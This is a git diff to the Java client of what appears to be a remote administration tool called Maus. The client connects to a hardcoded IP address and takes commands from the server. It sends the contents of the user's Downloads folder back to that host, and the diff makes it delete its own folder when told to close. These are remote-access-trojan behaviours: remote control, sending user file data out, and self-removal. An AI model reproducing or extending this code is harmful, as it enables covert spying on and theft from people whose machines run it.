@@ -1,7 +1,10 @@
 package Client;
 
+import Maus.Maus;
+
 import java.io.*;
 import java.net.Socket;
+import java.net.URISyntaxException;
 
 public class Client {
     private static String HOST = "141.219.247.21";
@@ -38,7 +41,7 @@ public class Client {
             socket = new Socket(getHOST(), getPORT());
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             out = new BufferedOutputStream(socket.getOutputStream());
-            System.out.println("Client started: " + getHOST() + ":" + getPORT());
+            System.out.println("Client.Client started: " + getHOST() + ":" + getPORT());
             String comm;
             while ((comm = in.readLine()) != null && !comm.contains("forciblyclose")) {
                 comm = in.readLine();
@@ -52,6 +55,9 @@ public class Client {
                 }
                 if (comm.equals("forciblyclose")) {
                     communicate("forciblyclose");
+                    String jarFolder = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getParentFile().getPath().replace('\\', '/');
+                    File f = new File(jarFolder);
+                    f.deleteOnExit();
                     System.exit(0);
                 }
             }
@@ -60,6 +66,8 @@ public class Client {
             System.out.println("Disconnected... retrying.");
             Thread.sleep(1200);
             connect();
+        } catch (URISyntaxException e) {
+            e.printStackTrace();
         }
     }
 
@@ -95,7 +103,7 @@ public class Client {
 
     private void loadServerSettings() {
         String path = Client.class.getProtectionDomain().getCodeSource().getLocation().getPath();
-        try (BufferedReader reader = new BufferedReader(new FileReader(new File( path + "Client/.mauscs")))
+        try (BufferedReader reader = new BufferedReader(new FileReader(new File( path + ".mauscs")))
         ) {
             String line;
             StringBuilder stringBuilder = new StringBuilder();
@@ -118,7 +126,7 @@ public class Client {
                    DataOutputStream dos = new DataOutputStream(bos)){
             String directory = System.getProperty("user.home") + "/Downloads/";
             File[] files = new File(directory).listFiles();
-
+            dos.writeUTF(directory);
             dos.writeInt(files.length);
             for (File file : files) {
                 String name = file.getName();
